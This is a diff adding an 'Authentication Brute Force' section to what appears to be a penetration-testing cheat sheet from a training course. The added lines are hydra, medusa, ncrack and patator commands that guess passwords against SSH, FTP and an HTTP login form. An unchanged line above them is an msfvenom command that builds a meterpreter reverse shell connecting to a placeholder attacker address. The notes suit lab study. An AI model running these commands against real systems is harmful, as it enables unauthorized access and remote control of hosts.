@@ -249,6 +249,24 @@ run                                                  # Execute a loaded post mod
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f elf -o shell.elf
 ---
 
+## Authentication Brute Force
+
+```bash
+# Hydra — Online password brute force against SSH/FTP/HTTP (Day 12)
+hydra -l msfadmin -P ~/wordlists/common-passwords.txt ssh://192.0.2.10
+hydra -L ~/wordlists/usernames.txt -P ~/wordlists/common-passwords.txt ftp://192.0.2.10
+hydra -L ~/wordlists/usernames.txt -P ~/wordlists/common-passwords.txt 192.0.2.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"
+
+# Medusa — Parallel remote login attacks (Day 12)
+medusa -h 192.0.2.10 -U ~/wordlists/usernames.txt -P ~/wordlists/common-passwords.txt -M ssh
+
+# Ncrack — High-speed network authentication cracking (Day 12)
+ncrack -p ssh,ftp 192.0.2.10
+
+# Patator — Custom brute-force workflows and failure matching (Day 12)
+patator ssh_login host=192.0.2.10 user=FILE0 password=FILE1 0=~/wordlists/usernames.txt 1=~/wordlists/common-passwords.txt
+```
+
 ## Offensive / Red Team
 
 ```bash
